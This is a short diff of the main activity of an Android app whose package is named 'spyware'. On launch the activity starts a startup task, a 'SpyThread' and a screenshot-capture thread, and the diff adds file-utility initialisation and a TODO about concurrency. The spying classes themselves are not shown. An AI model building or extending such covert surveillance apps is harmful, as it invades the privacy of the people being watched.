@@ -2,6 +2,7 @@ package com.example.cristianturetta.spyware;
 
 import android.Manifest;
 import android.app.Activity;
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.AsyncTask;
@@ -24,8 +25,13 @@ public class MainActivity extends AppCompatActivity {
 
         setContentView(R.layout.activity_main);
 
+        Context context = getApplicationContext();
+
+        // TODO: 24/09/18 Concurrency problem on runnables if onCreate is started multiple times!
+        FileUtil.init(context);
         (new StartupAsyncTask()).execute();
         (new SpyThread()).start();
         new Thread((new ScreenshotUtilRunnable())).start();
+
     }
 }
